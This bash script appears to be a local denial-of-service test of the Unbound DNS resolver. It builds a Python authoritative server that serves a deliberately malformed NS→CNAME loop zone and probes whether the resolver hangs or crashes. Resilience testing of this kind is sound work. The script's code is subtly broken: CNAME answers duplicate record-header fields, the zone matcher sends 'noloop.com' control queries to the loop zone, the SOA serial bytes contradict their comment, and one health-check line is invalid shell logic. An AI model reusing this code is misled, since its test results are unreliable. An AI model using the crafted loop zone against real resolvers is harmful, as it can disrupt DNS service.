#!/usr/bin/env bash
# Unbound CNAME Loop DoS Test (v2)
# Uses a Python authoritative DNS server to serve NS→CNAME loop zone
# (BIND9 refuses to load NS→CNAME zones, which is RFC-compliant)
set -euo pipefail

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 > /dev/null 2>&1

VDIR="/workspace/output/unbound-cname-loop-test"
mkdir -p "$VDIR"

UNBOUND="/workspace/output/unbound-binary-baseline"

kill_all() {
  pkill -f "python3.*5355" 2>/dev/null || true
  pkill -f "unbound.*5353" 2>/dev/null || true
  rm -f "$VDIR"/*.pid 2>/dev/null || true
  sleep 1
}

echo "╔══════════════════════════════════════════════════════════╗"
echo "║  Unbound CNAME Loop DoS Test (v2)                       ║"
echo "║  Python auth server + Unbound resolver                   ║"
echo "╚══════════════════════════════════════════════════════════╝"
kill_all

# ═══════════════════════════════════════════════════════════════════
# Step 1: Python authoritative DNS server serving CNAME loop zone
# ═══════════════════════════════════════════════════════════════════
echo ""
echo "═══ Step 1: Starting Python authoritative server ═══"

cat > "$VDIR/auth_server.py" << 'PYEOF'
#!/usr/bin/env python3
"""Simple authoritative DNS server serving NS→CNAME loop zone."""
import socket, struct, sys, threading, time

# Zone data: loop.com
# NS → CNAME → CNAME → NS loop
ZONE_LOOP = {
    # SOA
    ('loop.com', 6): [  # SOA
        (b'\x03ns1\x04loop\x03com\x00'  # MNAME
         b'\x05admin\x04loop\x03com\x00'  # RNAME
         b'\x7f\x82\x25\x61'  # SERIAL: 2026100901
         b'\x00\x00\x0e\x10'  # REFRESH: 3600
         b'\x00\x00\x03\x84'  # RETRY: 900
         b'\x00\x09\x3a\x80'  # EXPIRE: 604800
         b'\x00\x01\x51\x80') # MINIMUM: 86400
    ],
    # NS
    ('loop.com', 2): [  # NS
        b'\x03ns1\x04loop\x03com\x00'
    ],
    # ns1.loop.com CNAME → alias1.loop.com
    ('ns1.loop.com', 5): [  # CNAME
        b'\x06alias1\x04loop\x03com\x00'
    ],
    # alias1.loop.com CNAME → alias2.loop.com
    ('alias1.loop.com', 5): [  # CNAME
        b'\x06alias2\x04loop\x03com\x00'
    ],
    # alias2.loop.com CNAME → ns1.loop.com (LOOP BACK!)
    ('alias2.loop.com', 5): [  # CNAME
        b'\x03ns1\x04loop\x03com\x00'
    ],
    # A record for ns1 (needed for glue, but we also have CNAME - this is the violation)
}

# Zone data: noloop.com (control)
ZONE_NOLOOP = {
    ('noloop.com', 6): [
        (b'\x03ns1\x06noloop\x03com\x00'
         b'\x05admin\x06noloop\x03com\x00'
         b'\x7f\x82\x25\x61'
         b'\x00\x00\x0e\x10'
         b'\x00\x00\x03\x84'
         b'\x00\x09\x3a\x80'
         b'\x00\x01\x51\x80')
    ],
    ('noloop.com', 2): [
        b'\x03ns1\x06noloop\x03com\x00'
    ],
    ('ns1.noloop.com', 1): [
        b'\x7f\x00\x00\x01'  # 127.0.0.1
    ],
    ('www.noloop.com', 1): [
        b'\x0a\x00\x00\x01'  # 10.0.0.1
    ],
}

def dns_encode_name(name):
    """Encode a DNS name into wire format."""
    result = b''
    for label in name.split('.'):
        if label:
            result += struct.pack('B', len(label)) + label.encode()
    result += b'\x00'
    return result

def build_response(qname, qtype, qclass, zone_data, txid, flags=0x8400):
    """Build a DNS response for a query."""
    # Find matching records
    key = (qname.lower(), qtype)
    answers = zone_data.get(key, [])

    # Also check for CNAME if querying for A and no direct A record
    cname_chain = []
    if qtype != 5 and not answers:  # 5 = CNAME
        cname_key = (qname.lower(), 5)
        cname_rdata = zone_data.get(cname_key, [])
        if cname_rdata:
            cname_chain.append((qname, cname_rdata[0]))

    # Build response
    ancount = len(answers) + len(cname_chain)
    header = struct.pack('!HHHHHH', txid, flags, 1, ancount, 0, 0)

    # Question section
    qname_wire = dns_encode_name(qname)
    question = qname_wire + struct.pack('!HH', qtype, qclass)

    # Answer section
    answer = b''
    for cname_name, cname_rdata in cname_chain:
        answer += dns_encode_name(cname_name)
        answer += struct.pack('!HHIHH', 5, qclass, 300, len(cname_rdata), 0)[:10]
        answer += struct.pack('!HH', 5, qclass)  # type, class
        answer += struct.pack('!I', 300)  # TTL
        answer += struct.pack('!H', len(cname_rdata))  # rdlength
        answer += cname_rdata  # rdata

    for rdata in answers:
        answer += dns_encode_name(qname)
        answer += struct.pack('!HH', qtype, qclass)
        answer += struct.pack('!I', 300)  # TTL
        answer += struct.pack('!H', len(rdata))  # rdlength
        answer += rdata

    return header + question + answer

def handle_query(data, addr, sock):
    """Handle a DNS query."""
    if len(data) < 12:
        return

    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if (flags >> 15) != 0:  # Not a query
        return
    opcode = (flags >> 11) & 0xF
    if opcode != 0:  # Not standard query
        # Send NOTIMP
        resp = struct.pack('!HHHHHH', txid, 0x8404, qdcount, 0, 0, 0)
        resp += data[12:]  # echo question
        sock.sendto(resp, addr)
        return

    # Parse question
    offset = 12
    labels = []
    while offset < len(data) and data[offset] != 0:
        label_len = data[offset]
        if label_len == 0 or offset + 1 + label_len > len(data):
            break
        labels.append(data[offset+1:offset+1+label_len].decode('ascii', errors='replace'))
        offset += 1 + label_len

    qname = '.'.join(labels)
    qtype, qclass = struct.unpack('!HH', data[offset+1:offset+5])

    log_msg = f"  [AUTH] Query from {addr}: {qname} TYPE={qtype} CLASS={qclass}"

    # Determine which zone
    if qname.endswith('loop.com') or qname == 'loop.com':
        zone = ZONE_LOOP
        log_msg += " (loop.com zone)"
    elif qname.endswith('noloop.com') or qname == 'noloop.com':
        zone = ZONE_NOLOOP
        log_msg += " (noloop.com zone)"
    else:
        # REFUSED
        resp = struct.pack('!HHHHHH', txid, 0x8405, qdcount, 0, 0, 0)
        resp += data[12:]
        sock.sendto(resp, addr)
        log_msg += " (REFUSED - unknown zone)"
        print(log_msg, flush=True)
        return

    # Build and send response
    resp = build_response(qname, qtype, qclass, zone, txid)
    sock.sendto(resp, addr)
    log_msg += f" → answers={struct.unpack('!H', resp[6:8])[0]}"
    print(log_msg, flush=True)

def run_server(port=5355):
    """Run the DNS server."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    print(f"  [AUTH] Python DNS server listening on 127.0.0.1:{port}", flush=True)

    while True:
        try:
            data, addr = sock.recvfrom(4096)
            handle_query(data, addr, sock)
        except Exception as e:
            print(f"  [AUTH] Error: {e}", flush=True)

run_server(5355)
PYEOF

python3 "$VDIR/auth_server.py" > "$VDIR/auth.log" 2>&1 &
AUTH_PID=$!
echo "  Auth server started (PID=$AUTH_PID)"
sleep 1

# Quick test: query the auth server directly
echo "  Testing auth server directly..."
dig @127.0.0.1 -p 5355 loop.com NS +time=3 +tries=1 2>&1 | head -12
echo ""
dig @127.0.0.1 -p 5355 ns1.loop.com A +time=3 +tries=1 2>&1 | head -12
echo ""
dig @127.0.0.1 -p 5355 ns1.loop.com CNAME +time=3 +tries=1 2>&1 | head -12

# ═══════════════════════════════════════════════════════════════════
# Step 2: Unbound as recursive resolver
# ═══════════════════════════════════════════════════════════════════
echo ""
echo "═══ Step 2: Starting Unbound resolver ═══"

cat > "$VDIR/unbound.conf" << 'EOF'
server:
    directory: "/workspace/output/unbound-cname-loop-test"
    pidfile: "/workspace/output/unbound-cname-loop-test/unbound.pid"
    port: 5353
    interface: 127.0.0.1
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    verbosity: 3
    log-queries: yes
    log-replies: yes
    log-local-actions: yes
    # CNAME chase limits
    target-fetch-policy: "0 0 0 0 0"
    harden-short-bufsize: yes
    harden-large-queries: yes

stub-zone:
    name: "loop.com"
    stub-addr: 127.0.0.1@5355
stub-zone:
    name: "noloop.com"
    stub-addr: 127.0.0.1@5355

remote-control:
    control-enable: no
EOF

"$UNBOUND" -c "$VDIR/unbound.conf" > "$VDIR/unbound.log" 2>&1 &
sleep 2

if [ -f "$VDIR/unbound.pid" ] && kill -0 "$(cat "$VDIR/unbound.pid")" 2>/dev/null; then
  echo "  Unbound started (PID=$(cat "$VDIR/unbound.pid"))"
else
  echo "  Unbound failed to start. Log:"
  cat "$VDIR/unbound.log" | head -20
  kill_all
  exit 1
fi

# ═══════════════════════════════════════════════════════════════════
# Step 3: Run queries through Unbound
# ═══════════════════════════════════════════════════════════════════
echo ""
echo "═══ Step 3: Testing queries through Unbound ═══"

# Baseline: noloop.com
echo ""
echo "  --- Baseline: noloop.com (no loop) ---"
R0=$(dig @127.0.0.1 -p 5353 www.noloop.com A +time=5 +tries=1 2>&1)
echo "$R0" | head -15
RCODE0=$(echo "$R0" | grep "status:" | awk '{print $4}' | tr -d ',')
echo "  RCODE: $RCODE0"

# Test: loop.com A record
echo ""
echo "  --- Test: www.loop.com A query (through NS→CNAME loop) ---"
START_NS=$(date +%s%N)
R1=$(dig @127.0.0.1 -p 5353 www.loop.com A +time=15 +tries=1 2>&1)
END_NS=$(date +%s%N)
ELAPSED_MS=$(( (END_NS - START_NS) / 1000000 ))
echo "$R1"
RCODE1=$(echo "$R1" | grep "status:" | awk '{print $4}' | tr -d ',')
QTIME1=$(echo "$R1" | grep "Query time:" | awk '{print $4}')
echo "  RCODE: $RCODE1, dig elapsed: ${ELAPSED_MS}ms, server query-time: ${QTIME1}ms"

# Test: loop.com NS record directly
echo ""
echo "  --- Test: loop.com NS query ---"
START_NS=$(date +%s%N)
R2=$(dig @127.0.0.1 -p 5353 loop.com NS +time=15 +tries=1 2>&1)
END_NS=$(date +%s%N)
ELAPSED_MS=$(( (END_NS - START_NS) / 1000000 ))
echo "$R2"
RCODE2=$(echo "$R2" | grep "status:" | awk '{print $4}' | tr -d ',')
echo "  RCODE: $RCODE2, dig elapsed: ${ELAPSED_MS}ms"

# Test: Resolve ns1.loop.com (the CNAME-looped nameserver)
echo ""
echo "  --- Test: ns1.loop.com A query (resolving the NS that is a CNAME) ---"
START_NS=$(date +%s%N)
R3=$(dig @127.0.0.1 -p 5353 ns1.loop.com A +time=15 +tries=1 2>&1)
END_NS=$(date +%s%N)
ELAPSED_MS=$(( (END_NS - START_NS) / 1000000 ))
echo "$R3"
RCODE3=$(echo "$R3" | grep "status:" | awk '{print $4}' | tr -d ',')
QTIME3=$(echo "$R3" | grep "Query time:" | awk '{print $4}')
echo "  RCODE: $RCODE3, dig elapsed: ${ELAPSED_MS}ms, server query-time: ${QTIME3}ms"

# Burst test
echo ""
echo "  --- Burst: 5 rapid queries to loop.com ---"
for i in 1 2 3 4 5; do
  START_NS=$(date +%s%N)
  RB=$(dig @127.0.0.1 -p 5353 loop.com NS +time=15 +tries=1 2>&1)
  END_NS=$(date +%s%N)
  ELAPSED_MS=$(( (END_NS - START_NS) / 1000000 ))
  RCB=$(echo "$RB" | grep "status:" | awk '{print $4}' | tr -d ',')
  echo "  Query $i: RCODE=$RCB, elapsed=${ELAPSED_MS}ms"
done

# ═══════════════════════════════════════════════════════════════════
# Step 4: Analyze logs
# ═══════════════════════════════════════════════════════════════════
echo ""
echo "═══ Step 4: Unbound log analysis ═══"

echo ""
echo "  --- CNAME/loop/delegation related entries ---"
grep -i "cname\|loop\|cycle\|recursion\|delegat\|chase\|referral" "$VDIR/unbound.log" 2>/dev/null | head -30 || echo "  (none)"

echo ""
echo "  --- SERVFAIL/error entries ---"
grep -i "servfail\|error\|fail\|timeout" "$VDIR/unbound.log" 2>/dev/null | head -20 || echo "  (none)"

echo ""
echo "  --- loop.com resolution entries ---"
grep -i "loop\.com" "$VDIR/unbound.log" 2>/dev/null | head -30 || echo "  (none)"

# ═══════════════════════════════════════════════════════════════════
# Step 5: Health check + post-test
# ═══════════════════════════════════════════════════════════════════
echo ""
echo "═══ Step 5: Process health & post-test ═══"

if [ -f "$VDIR/unbound.pid" ] && kill -0 "$(cat "$VDIR/unbound.pid")" 2>/dev/null; then
  echo "  Unbound: ALIVE (PID=$(cat "$VDIR/unbound.pid"))"
  ps -o pid,rss,vsz,comm -p "$(cat "$VDIR/unbound.pid")" 2>/dev/null || true
else
  echo "  Unbound: DEAD/CRASHED!"
fi

echo "  Auth server: ALIVE (PID=$AUTH_PID)" if kill -0 "$AUTH_PID" 2>/dev/null

# Post-test: can Unbound still resolve?
echo ""
echo "  Post-test: noloop.com resolution check..."
RPOST=$(dig @127.0.0.1 -p 5353 www.noloop.com A +time=5 +tries=1 2>&1)
RCODE_POST=$(echo "$RPOST" | grep "status:" | awk '{print $4}' | tr -d ',')
echo "  RCODE: $RCODE_POST"

echo ""
echo "  Auth server log:"
cat "$VDIR/auth.log" 2>/dev/null | head -30

# ═══════════════════════════════════════════════════════════════════
echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  CNAME Loop DoS Test - Summary                         ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
echo "  CNAME Loop: ns1.loop.com→CNAME→alias1→CNAME→alias2→CNAME→ns1"
echo ""
echo "  Results:"
echo "    loop.com NS query:   RCODE=$RCODE2"
echo "    ns1.loop.com A:      RCODE=$RCODE3"
echo "    Post-test noloop.com: RCODE=$RCODE_POST"
echo ""
echo "  RFC 2181 S10.3 requires NS MUST NOT be a CNAME."
echo "  BIND9 correctly rejected this zone at load time."
echo "  Unbound behavior:"

if [ "$RCODE2" = "SERVFAIL" ] || [ "$RCODE3" = "SERVFAIL" ]; then
  echo "    → Returned SERVFAIL (detected loop but did NOT reject NS→CNAME at delegation)"
  echo "    → Partial fail-safe: resolution fails gracefully, but RFC violation not caught at entry"
elif [ "$RCODE2" = "NOERROR" ] || [ "$RCODE3" = "NOERROR" ]; then
  echo "    → Returned NOERROR (FAILED to detect CNAME loop - critical violation!)"
else
  echo "    → Returned RCODE=$RCODE2/$RCODE3 (unexpected)"
fi

if [ "$RCODE_POST" = "NOERROR" ]; then
  echo "    → Post-test: Unbound still functional (not crashed by loop)"
else
  echo "    → Post-test: Unbound impaired! (possible DoS impact)"
fi

kill_all
kill "$AUTH_PID" 2>/dev/null || true
echo ""
echo "=== Test Complete ==="
